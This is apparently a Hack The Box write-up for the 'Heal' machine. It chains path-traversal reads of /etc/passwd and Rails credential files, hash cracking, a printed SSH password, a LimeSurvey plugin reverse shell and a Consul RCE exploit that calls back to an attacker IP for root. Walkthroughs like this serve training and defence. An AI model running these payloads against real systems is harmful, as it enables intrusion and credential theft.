# Heal

```
Difficulty: Medium
Operating System: Linux
Hints: True
```

##  Summary

| Step | User / Access | Technique Used                      | Result                                                                                     |
| :--- | :------------ | :---------------------------------- | :----------------------------------------------------------------------------------------- |
| 1    | `N/A`         | Port Scanning & Service Enumeration | Discovered HTTP (80) and SSH (22) open.                                                    |
| 2    | `N/A`         | Subdomain Enumeration               | Found `api.heal.htb` and `take-survey.heal.htb`.                                           |
| 3    | `N/A`         | Directory Fuzzing                   | Discovered admin panel and phpMyAdmin directories.                                         |
| 4    | `N/A`         | Arbitrary File Read                 | Accessed `/etc/passwd`, Rails `database.yml`, and SQLite DB to gather usernames/passwords. |
| 5    | `ron`         | Credential Use / SSH Login          | Logged in via SSH using password from database hash.                                       |
| 6    | `www-data`    | LimeSurvey RCE Plugin               | Uploaded malicious plugin, obtained webshell, and retrieved database config.               |
| 7    | `ron`         | SSH Local Port Forwarding           | Forwarded internal Consul port 8500 to local machine.                                      |
| 8    | `root`        | Consul v1.19.2 RCE                  | Exploited remote code execution to obtain root shell.                                      |


## Nmap Enumeration

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] 
❯ nmap -sSCV -Pn heal.htb
````

**Nmap Results:**

| Port   | State | Service | Version                          |
| ------ | ----- | ------- | -------------------------------- |
| 22/tcp | open  | ssh     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 |
| 80/tcp | open  | http    | nginx 1.18.0                     |

* HTTP title: `Heal`
* Service Info: Linux OS detected
* CPE: `cpe:/o:linux:linux_kernel`

**Observation:** Only SSH and HTTP open; web server appears to host multiple subdomains.

---

## Subdomain Enumeration

```bash
ffuf -u http://heal.htb/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.heal.htb" -mc 200
```

**Discovered subdomains:**

* `api.heal.htb`
* `take-survey.heal.htb`

Add discovered subdomains to `/etc/hosts`:

```text
10.10.11.46 api.heal.htb
10.10.11.46 take-survey.heal.htb
```

**Additional observation:** `/surveyA` route under `take-survey.heal.htb`.

---

## Directory Discovery (Dirsearch)

```bash
dirsearch -u "http://take-survey.heal.htb/index.php/" -t 50 -i 200
```

**Interesting directories found:**

| Directory                             | Notes                                        |
| ------------------------------------- | -------------------------------------------- |
| `/index.php/admin/mysql/index.php`    | Admin login page redirects to authentication |
| `/index.php/apc/index.php`            | Accessible                                   |
| `/index.php/pma/index.php`            | phpMyAdmin page                              |
| `/index.php/web/phpMyAdmin/index.php` | phpMyAdmin page                              |

* Admin login interface:
  `http://take-survey.heal.htb/index.php/admin/authentication/sa/login`

---

## Arbitrary File Reading

1. Register a user and access `/resume` page.
2. Intercept **Export as PDF** requests in Burp Suite.
3. Analyze the `/download` request; found **arbitrary file read vulnerability**:

```http
GET /download?filename=../../../../../etc/passwd
```

**Results:** Found usernames: `ralph`, `ron`.

4. Rails config file found:

```http
GET /download?filename=../../config/database.yml
GET /download?filename=../../storage/development.sqlite3
```

* Retrieved Ralph’s password hash from SQLite database.
* Cracked with **John**:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

* Successfully obtained Ralph’s password hash.
* Note: Ralph’s hash allowed **Ron** to log in via SSH.

**SSH Login:**

```text
username: ron
password: AdmiDi0_pA$$w0rd
```

---

## LimeSurvey RCE

1. Found **LimeSurvey RCE** exploit on GitHub: [Y1LD1R1M-1337 / Limesurvey-RCE](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)
2. Modifications required:

   * Set `compatibilityversion` to match LimeSurvey v6.0
   * Configure **SHELL** with attacker's IP and port
3. Package exploit:

```bash
zip z0n_zip config.xml php-rev.php
```

4. Upload and activate plugin via:

```
http://take-survey.heal.htb/upload/plugins/z0n_hacker/php-rev.php
```

5. Spawn a reverse shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

* Access configuration file: `/var/www/limesurvey/application/config/config.php`
* Retrieved database username and password.

**Observation:** Only user `ralph` exists in database, but SSH login works for `ron` using the same password.

---

## Privilege Escalation

1. Upload **LinPEAS.sh** for enumeration.
2. Forward internal port 8500 via SSH:

```bash
ssh -L 8500:127.0.0.1:8500 ron@heal.htb
```

3. Found **HashiCorp Consul v1.19.2** running.
4. Search for known exploits → **RCE exploit**:

* Exploit-DB: `Hashicorp Consul v1.0 - Remote Command Execution (RCE)`
* Use local port 8500 to execute payload:

```bash
python exploit.py 127.0.0.1 8500 10.10.16.29 6666 0
```

* Listener receives a reverse shell.

* ACL token parameter ignored locally → exploit succeeds.

* Achieved **root shell** via Consul RCE.

---

**Takeaways:**

* Carefully inspect file download/export functionality for path traversal vulnerabilities.
* Rails configuration files can leak critical database credentials.
* Malicious plugin upload and webshells are common post-auth attack vectors.
* Internal services like Consul can provide easy privilege escalation if exposed.
